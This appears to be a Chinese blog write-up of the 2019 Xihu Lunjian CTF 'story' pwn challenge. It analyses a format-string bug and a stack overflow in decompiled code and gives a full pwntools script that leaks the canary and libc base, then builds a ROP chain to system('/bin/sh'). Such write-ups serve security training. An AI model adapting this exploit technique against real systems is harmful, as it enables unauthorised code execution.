---
title: 2019-西湖论剑CTF-story
date: 2019-04-09 23:17:59
tags: [fmt,rop]
---

## 0x00 程序分析

```
Canary                        : Yes →  value: 0xf2afb7df22cc0200
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Full
```

格式化字符串漏洞

```c
char *sub_400915()
{
  char *v0; // ST08_8
  char s; // [rsp+10h] [rbp-40h]
  unsigned __int64 v3; // [rsp+48h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Please Tell Your ID:");
  sub_400ABE((__int64)&s, 0x32uLL);
  v0 = strdup(&s);
  printf("Hello ", 50LL);
  printf(&s);
  putchar(10);
  return v0;
}
```
程序自定义了一个输入函数sub_400ABE，功能就是向s中写入v1长度的字符串，但是s长度并没有大到1024，所以存在溢出，可以覆盖sub_4009A0这个函数的返回地址
```c
char *sub_4009A0()
{
  __int64 v1; // [rsp+0h] [rbp-A0h]
  char s; // [rsp+10h] [rbp-90h]
  unsigned __int64 v3; // [rsp+98h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("Tell me the size of your story:");
  v1 = sub_400A54();
  if ( v1 < 0 )
    v1 = -v1;
  if ( v1 > 128 )
    v1 = 1024LL;
  puts("You can speak your story:");
  sub_400ABE((__int64)&s, v1);
  return strdup(&s);
}
```

## 0x01 思路

程序存在格式化字符串漏洞、栈溢出，存在Canary，未开启PIE
- 利用格式化字符串漏洞获得栈上的Canary
- 利用格式化字符串漏洞打印函数地址，搜索libc的版本，获取偏移，计算得到-libc_base，计算得到system、/bin/sh、pop rdi；ret的地址
- 利用栈溢出劫持程序流

## 0x02 EXP

```python
#/usr/bin/env python
from pwn import *
REMOTE = 0
if REMOTE:
	p = remote('ctf1.linkedbyx.com',10255)
else:	
	p = process('./story')

VERBOSE = 1
DEBUG = 0
if VERBOSE:
	context(log_level = 'debug')
if DEBUG:
	gdb.attach(p)
def q():
	gdb.attach(p)
	raw_input("test")
  
elf = ELF('./story')
libc = ELF('./libc.so.6')
pop_rdi_ret = 0x400bd3

def pwn():
	p.recvuntil('Please Tell Your ID:')
	p.sendline("%11$p#%15$p#")
	p.recvuntil('Hello ')
	libc_base = int(p.recvuntil('#',drop = True),16)-libc.symbols['_IO_file_setbuf']-9
	log.success('libc_base: '+hex(libc_base))
	binsh = libc_base + libc.search('/bin/sh\x00').next()
	system = libc_base + libc.symbols['system']
	canary = int(p.recvuntil('#',drop = True),16)
	log.success('canary: '+hex(canary))
	#one_gadgets = libc_base + 0xf1147
	#log.success('one_gadgets: '+hex(one_gadgets))
	p.recvuntil('Tell me the size of your story:')
	p.sendline('200')
	p.recvuntil('You can speak your story:')
	payload = 'a'*136+p64(canary)*2+p64(pop_rdi_ret)+p64(binsh)+p64(system)
	p.sendline(payload)
	p.interactive()
if __name__ == '__main__':
	pwn()	
```

首先用格式化字符串泄露libc和canary，在用溢出修改返回地址获得shell

